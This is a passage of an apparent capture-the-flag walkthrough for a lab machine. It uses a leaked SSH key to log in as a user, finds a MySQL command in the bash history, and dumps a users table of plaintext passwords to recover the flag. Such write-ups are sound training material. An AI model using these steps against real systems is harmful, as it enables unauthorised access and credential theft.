With the ssh key obtained in IMAP we can build and id_rsa file. After that we have to grant the correct privileges to the file and we can log in to SSH with tom credentials

```bash
vim id_rsa
...
Paste the public key and save
...

chmod 600 id_rsa
ssh -i id_rsa tom@10.129.216.52
```

Inside the server, we can check all the files and folders but nothing cames up. If we check the .bash_history file (~/.bash_history) we can find that a mysql command was used.

```bash
mysql -u tom -p
```

So lets use it

```bash
mysql -u tom -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 8.0.27-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

We are in the mysql database, lets find information

```bash
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| users              |
+--------------------+
5 rows in set (0.01 sec)

mysql> use users;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-----------------+
| Tables_in_users |
+-----------------+
| users           |
+-----------------+
1 row in set (0.00 sec)

mysql> select * from users;


+------+-------------------+------------------------------+
| id   | username          | password                     |
+------+-------------------+------------------------------+
|    1 | ppavlata0         | 6znAfvTbB2                   |
|    2 | ktofanini1        | TP2NxFD62e                   |
|    3 | rallwell2         | t1t7WaqvEfv                  |
|    4 | efernier3         | ZRYOBO9PI                    |
...
|  150 | HTB               | cr3n4o7rzse7rzhnckhssncif7ds |
...
```

And there it is, the HTB password